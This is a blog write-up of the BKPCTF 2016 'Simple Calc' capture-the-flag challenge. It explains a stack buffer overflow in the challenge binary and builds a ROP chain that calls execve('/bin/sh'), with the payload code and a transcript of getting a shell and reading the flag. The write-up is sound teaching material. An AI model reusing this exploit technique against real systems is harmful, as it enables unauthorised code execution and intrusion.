<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="BKPCTF 2016 - Simple Calc" prefix="og: http://ogp.me/ns#" property=og:title><meta content="BKPCTF 2016 - Simple Calc - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-03-07-bkpctf-2016-simple-calc-writeup property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="BKPCTF 2016 - Simple Calc - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-03-07-bkpctf-2016-simple-calc-writeup name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2016-03-07-bkpctf-2016-simple-calc-writeup",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description": BKPCTF 2016 - Simple Calc - by hugsy",
      
    }
    </script><title>
  BKPCTF 2016 - Simple Calc
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>BKPCTF 2016 - Simple Calc</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 7 March 2016 <br> <br> <i>Reading time: 6 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><h3 id=info>Info</h3><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>~/cur/simple_calc</span><span> $ file b28b103ea5f1171553554f0127696a18c6d2dcf7
</span><span style=color:#bf616a>b28b103ea5f1171553554f0127696a18c6d2dcf7:</span><span> ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux)</span><span style=color:#bf616a>,</span><span> statically linked, for GNU/Linux 2.6.24, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
</span><span style=color:#bf616a>~/cur/simple_calc</span><span> $ checksec.sh</span><span style=color:#bf616a> --file</span><span> b28b103ea5f1171553554f0127696a18c6d2dcf7
</span><span style=color:#bf616a>RELRO</span><span>           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span style=color:#bf616a>Partial</span><span> RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   b28b103ea5f1171553554f0127696a18c6d2dcf7
</span></code></pre><h3 id=vulnerability>Vulnerability</h3><p><code>simple_calc</code> offered a binary that expects us to make some calculations. It will ask for a number of calculations (say <em>N</em>) to perform and will <code>malloc()</code> <em>N</em>x4 bytes in the heap. If we decompile with <a rel="noopener nofollow noreferrer" href=https://www.hex-rays.com/products/ida/ target=_blank>IDA</a>, it’ll look something like this:</p><a href=https://i.imgur.com/aFaqYf6.png target=_blank> <img alt=vuln_in_ida src=https://i.imgur.com/aFaqYf6.png title=vuln_in_ida width=100%> </a><p>Then a loop of <em>N</em> iterations will commence, each iteration offering to perform one of the possible arithmetic operations, ADD/SUB/MUL/DIV, or exit. Those operations perform pretty much what you expect of them, which take in 2 DWORD operands, and apply the function. What is worth noticing is that both operands and result are stored in the <code>.bss</code> (therefore at predictable addresses).<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#96b5b4>[...]
</span><span style=color:#8fa1b3>.bss:00000000006C4A84 add_operator_2  </span><span style=color:#96b5b4>dd </span><span style=color:#8fa1b3>?</span><span style=color:#65737e>                    ; DATA XREF: adds+40
</span><span style=color:#8fa1b3>.bss:00000000006C4A84</span><span style=color:#65737e>                                         ; adds+69 ...
</span><span style=color:#8fa1b3>.bss:00000000006C4A88 add_result      </span><span style=color:#96b5b4>dd </span><span style=color:#8fa1b3>?</span><span style=color:#65737e>                    ; DATA XREF: adds+96
</span><span style=color:#8fa1b3>.bss:00000000006C4A88</span><span style=color:#65737e>                                         ; adds+9C ...
</span><span style=color:#8fa1b3>.bss:00000000006C4A8C                 </span><span style=color:#96b5b4>align </span><span style=color:#d08770>10h
</span><span style=color:#8fa1b3>.bss:00000000006C4A90                 public div_operator_1
</span><span style=color:#8fa1b3>.bss:00000000006C4A90 div_operator_1  </span><span style=color:#96b5b4>dd </span><span style=color:#8fa1b3>?</span><span style=color:#65737e>                    ; DATA XREF: divs+13
</span><span style=color:#8fa1b3>.bss:00000000006C4A90</span><span style=color:#65737e>                                         ; divs+5E ...
</span><span style=color:#8fa1b3>.bss:00000000006C4A94 div_operator_2  </span><span style=color:#96b5b4>dd </span><span style=color:#8fa1b3>?</span><span style=color:#65737e>                    ; DATA XREF: divs+40
</span><span style=color:#8fa1b3>.bss:00000000006C4A94</span><span style=color:#65737e>                                         ; divs+69 ...
</span><span style=color:#8fa1b3>.bss:00000000006C4A98 div_result      </span><span style=color:#96b5b4>dd </span><span style=color:#8fa1b3>?</span><span style=color:#65737e>                    ; DATA XREF: divs+9B
</span><span style=color:#96b5b4>[...]
</span></code></pre><p>By exiting, <code>simple_calc</code> performs a <code>memcpy()</code> of the malloc-ed buffer (whose length is controlled by us) into a stack buffer (of length 0x28 bytes) located at $rbp+40h. <a href=https://i.imgur.com/0wcLH24.png target=_blank> <img alt=overflow src=https://i.imgur.com/0wcLH24.png title=overflow width=100%> </a><p>It is then easy to spot the trivial stack buffer overflow.<h3 id=exploitation>Exploitation</h3><p>When an operation is finished, the resulting DWORD is stored inside the malloc-ed buffer at the offset corresponding of the main loop iteration. So the game here is to play with those (basic) arithmetic operations to write arbitrary data in the malloc-ed buffer: for example, if we want to write 0x10001000 | 0x20002000 in our malloc-ed buffer, we would create 2 operations, then perform:<ol><li>an ADD with op1=0x10000000 and op2=0x00001000<li>an ADD with op1=0x20000000 and op2=0x00002000<li>and so on</ol><p>By calling successively the same arithmetic operation, say <code>ADD</code> (or any other), we have a predictable way to populate the malloc-ed buffer.<p>To corrupt the memory we must fill the stack buffer entirely (40 bytes), so make at least 10 operations. The stack buffer is followed (in the memory layout) by variables, so we add 24 bytes of junk (3 QWORD), another QWORD for overwriting the SFP, and a last to overwrite RIP.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>pwn</span><span>(</span><span style=color:#bf616a>s</span><span>):
</span><span>    addrs = [</span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>,
</span><span>             </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>,
</span><span>             </span><span style=color:#d08770>0x42424242</span><span>, </span><span style=color:#d08770>0x43434343</span><span>, </span><span style=color:#65737e># overwritten vars
</span><span>             </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#65737e># overwritten vars
</span><span>             </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#65737e># overwritten vars
</span><span>             </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#65737e># sfp
</span><span>             </span><span style=color:#d08770>0x45454545</span><span>, </span><span style=color:#d08770>0x45454545</span><span>, </span><span style=color:#65737e># rip
</span><span>             ]
</span></code></pre><p>We execute and a SIGSEGV was well caught (as seen with <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/gef target=_blank><code>gef</code></a>) :</p><a href=https://i.imgur.com/rn4XSOR.png target=_blank> <img alt=gef src=https://i.imgur.com/rn4XSOR.png title=gef width=100%> </a><p>However, the faulty instruction is in the <code>free()</code> following the <code>memcpy()</code> and yet not in the return from the main function. <code>free()</code> is trying to remove the chunk pointed by the value stored in $rdi (here 0x4444444444444444). However, a quick look in the man page (<code>man 3 free</code>) and we find our solution:<blockquote><p>The free() function frees the memory space pointed to by ptr,[…] If ptr is NULL, no operation is performed.</blockquote><p>So let’s rebuild our stack accordingly:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>pwn</span><span>(</span><span style=color:#bf616a>s</span><span>):
</span><span>    addrs = [</span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>,
</span><span>             </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>,
</span><span>             </span><span style=color:#d08770>0x42424242</span><span>, </span><span style=color:#d08770>0x43434343</span><span>, </span><span style=color:#65737e># overwritten vars
</span><span>             </span><span style=color:#d08770>0x00000000</span><span>, </span><span style=color:#d08770>0x00000000</span><span>, </span><span style=color:#65737e># for free(NULL)
</span><span>             </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#65737e># overwritten vars
</span><span>             </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#65737e># sfp
</span><span>             </span><span style=color:#d08770>0x45454545</span><span>, </span><span style=color:#d08770>0x45454545</span><span>, </span><span style=color:#65737e># rip
</span><span>             ]
</span></code></pre><p>We try again, and we hit the SIGSEGV in the RET. Perfect, time to bypass NX.<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>Program received signal SIGSEGV</span><span>, </span><span style=color:#8fa1b3>Segmentation fault.
</span><span style=color:#96b5b4>[...]
</span><span style=color:#d08770>0x40157c	 </span><span style=color:#8fa1b3>&LTmain</span><span>+</span><span style=color:#d08770>505</span><span style=color:#8fa1b3>>  </span><span style=color:#b48ead>mov    </span><span style=color:#bf616a>edi</span><span>,</span><span style=color:#bf616a>eax
</span><span style=color:#d08770>0x40157e	 </span><span style=color:#8fa1b3>&LTmain</span><span>+</span><span style=color:#d08770>507</span><span style=color:#8fa1b3>>  </span><span style=color:#b48ead>call   </span><span style=color:#d08770>0x4156d0 </span><span style=color:#8fa1b3>&LTfree>
</span><span style=color:#d08770>0x401583	 </span><span style=color:#8fa1b3>&LTmain</span><span>+</span><span style=color:#d08770>512</span><span style=color:#8fa1b3>>  </span><span style=color:#b48ead>mov    </span><span style=color:#bf616a>eax</span><span>,</span><span style=color:#d08770>0x0
</span><span style=color:#d08770>0x401588	 </span><span style=color:#8fa1b3>&LTmain</span><span>+</span><span style=color:#d08770>517</span><span style=color:#8fa1b3>>  </span><span style=color:#b48ead>leave
</span><span style=color:#d08770>0x401589	 </span><span style=color:#8fa1b3>&LTmain</span><span>+</span><span style=color:#d08770>518</span><span style=color:#8fa1b3>>  </span><span style=color:#b48ead>ret 		 </span><span style=color:#8fa1b3>← </span><span style=color:#96b5b4>$</span><span style=color:#8fa1b3>pc
</span><span style=color:#d08770>0x40158a	 </span><span style=color:#b48ead>nop    </span><span style=color:#96b5b4>WORD PTR </span><span>[</span><span style=color:#bf616a>rax</span><span>+</span><span style=color:#bf616a>rax</span><span>*</span><span style=color:#d08770>1</span><span>+</span><span style=color:#d08770>0x0</span><span>]
</span><span style=color:#d08770>0x401590	 </span><span style=color:#8fa1b3><__libc_start_main>  </span><span style=color:#b48ead>push   </span><span style=color:#bf616a>r14
</span></code></pre><p>We want to have a shell (what else, right?) so we need all the gadgets to syscall execve(‘/bin/sh’, 0, 0).<p>Bypassing NX is not that hard, all we need are the right gadgets. We choose a writable address, and write ‘/bin//sh’ (we arbitrarily chose 0x6c3110 in the <code>.bss</code>). Using <a rel="noopener nofollow noreferrer" href=https://github.com/JonathanSalwan/ROPgadget target=_blank><code>ropgadget</code></a> makes it easier than ever:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#d08770>0x401c87</span><span style=color:#8fa1b3>:                  # </span><span style=color:#b48ead>pop </span><span style=color:#bf616a>rsi</span><span style=color:#65737e> ; ret
</span><span style=color:#d08770>0x6c3110</span><span style=color:#8fa1b3>:                  # our writable address
</span><span style=color:#d08770>0x44db34</span><span style=color:#8fa1b3>:                  # </span><span style=color:#b48ead>pop </span><span style=color:#bf616a>rax</span><span style=color:#65737e> ; ret
</span><span style=color:#d08770>0x6e69622f</span><span>, </span><span style=color:#d08770>0x68732f2f</span><span>,    </span><span style=color:#8fa1b3># /bin//sh
</span><span style=color:#d08770>0x470f11                   </span><span style=color:#8fa1b3># </span><span style=color:#b48ead>mov </span><span style=color:#96b5b4>qword ptr </span><span>[</span><span style=color:#bf616a>rsi</span><span>], </span><span style=color:#bf616a>rax</span><span style=color:#65737e> ; ret
</span><span style=color:#d08770>0x447233</span><span style=color:#8fa1b3>:                  # </span><span style=color:#b48ead>mov    </span><span style=color:#bf616a>rax</span><span>,</span><span style=color:#bf616a>rsi</span><span style=color:#65737e>; ret
</span><span style=color:#d08770>0x479295                   </span><span style=color:#8fa1b3># </span><span style=color:#b48ead>mov </span><span style=color:#bf616a>edi</span><span>, </span><span style=color:#bf616a>eax</span><span style=color:#65737e> ; dec dword ptr [rax - 0x77] ; ret
</span></code></pre><p>At this stage, we have <code>/bin//sh</code> written @0x6c3110 and this address inside the EDI register. Then we can use the gadget <code>0x437aa9: pop rdx ; pop rsi ; ret</code> to populate RSI and RDX with 0. Because it embeds a libc, the binary is full of <code>syscall</code> instructions, we’ll use the one at 0x435675.<p>We now have our full chain:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>pwn</span><span>(</span><span style=color:#bf616a>s</span><span>):
</span><span>    addrs = [</span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>,
</span><span>             </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>, </span><span style=color:#d08770>0x41414141</span><span>,
</span><span>             </span><span style=color:#d08770>0x42424242</span><span>, </span><span style=color:#d08770>0x43434343</span><span>, </span><span style=color:#65737e># overwritten vars
</span><span>
</span><span>             </span><span style=color:#d08770>0x00000000</span><span>, </span><span style=color:#d08770>0x00000000</span><span>, </span><span style=color:#65737e># for free(NULL)
</span><span>             </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#65737e># last overwritten vars
</span><span>             </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#d08770>0x44444444</span><span>, </span><span style=color:#65737e># sfp
</span><span>
</span><span>             </span><span style=color:#d08770>0x401c87</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#65737e># pop rsi ; ret
</span><span>             </span><span style=color:#d08770>0x6c3110</span><span>,  </span><span style=color:#d08770>0x0</span><span>, </span><span style=color:#65737e># addr rw
</span><span>
</span><span>             </span><span style=color:#d08770>0x44db34</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#65737e># pop rax ; ret
</span><span>             </span><span style=color:#d08770>0x6e69622f</span><span>, </span><span style=color:#d08770>0x68732f2f</span><span>,  </span><span style=color:#65737e>#  /bin//sh
</span><span>
</span><span>             </span><span style=color:#d08770>0x470f11</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#65737e># mov qword ptr [rsi], rax ; ret
</span><span>
</span><span>             </span><span style=color:#d08770>0x447233</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#65737e># mov    rax,rsi; ret
</span><span>             </span><span style=color:#d08770>0x479295</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#65737e># mov edi, eax ; dec dword ptr [rax - 0x77] ; ret
</span><span>
</span><span>             </span><span style=color:#d08770>0x44db34</span><span>, </span><span style=color:#d08770>0x0</span><span>, </span><span style=color:#65737e># pop rax
</span><span>             </span><span style=color:#d08770>0x3b</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#65737e># syscall_execve
</span><span>
</span><span>             </span><span style=color:#d08770>0x437aa9</span><span>, </span><span style=color:#d08770>0x0</span><span>, </span><span style=color:#65737e># pop rdx ; pop rsi ; ret
</span><span>             </span><span style=color:#d08770>0</span><span>, </span><span style=color:#d08770>0</span><span>,
</span><span>             </span><span style=color:#d08770>0</span><span>, </span><span style=color:#d08770>0</span><span>,
</span><span>
</span><span>             </span><span style=color:#d08770>0x435675</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#65737e># syscall()
</span><span>    ]
</span></code></pre><p>Run and pwn !<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>/cur/simple_calc</span><span> $ ./simple_calc.py                                                                                                                                         </span><span style=color:#b48ead>[</span><span>23:36</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>[+]</span><span> Connected to localhost:5400
</span><span style=color:#bf616a>[+]</span><span> Running 45 calculations
</span><span style=color:#bf616a>[+]</span><span> Iter 1: got result 0x41414141
</span><span style=color:#bf616a>[+]</span><span> Iter 2: got result 0x41414141
</span><span style=color:#bf616a>[+]</span><span> Iter 3: got result 0x41414141
</span><span style=color:#bf616a>[+]</span><span> Iter 4: got result 0x41414141
</span><span style=color:#bf616a>[+]</span><span> Iter 5: got result 0x41414141
</span><span style=color:#bf616a>[+]</span><span> Iter 6: got result 0x41414141
</span><span style=color:#bf616a>[+]</span><span> Iter 7: got result 0x41414141
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>[+]</span><span> Triggering exploit
</span><span style=color:#bf616a>[+]</span><span> Got it, interacting (Ctrl-C to break)
</span><span style=color:#bf616a>[+]</span><span> Get a PTY with '</span><span style=color:#a3be8c> python -c "import pty;pty.spawn(</span><span>'/bin/bash'</span><span style=color:#a3be8c>)"  </span><span>'
</span><span style=color:#bf616a>ls
</span><span style=color:#bf616a>key
</span><span style=color:#bf616a>simple_calc
</span><span style=color:#bf616a>cat</span><span> key
</span><span style=color:#bf616a>BKPCTF{what_is_2015_minus_7547</span><span>}
</span></code></pre><p>The full exploit is <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/88e7137466505e0402ca target=_blank>here</a>.<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/gef/>#gef</a> <a href=https://blahcat.github.io/tags/ida/>#ida</a> <a href=https://blahcat.github.io/tags/bkpctf-2016/>#bkpctf-2016</a> <a href=https://blahcat.github.io/tags/x86/>#x86</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=BKPCTF 2016 - Simple Calc" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-03-08-bkpctf-2016-complex-calc/> <section class=post-nav-teaser><b class=post-nav-title>BKPCTF 2016 - Complex Calc</b><p class=post-nav-excerpt>The challenge is the sequel to simple_calc. If you haven’t read our write-u…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2013-12-23-read-write-process-memory-on-linux/> <section class=post-nav-teaser><b class=post-nav-title>Using new syscalls for read/write arbitrary memory on Linux.</b><p class=post-nav-excerpt>Even though well known methods exist to bypass ptrace deactivation on a pro…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>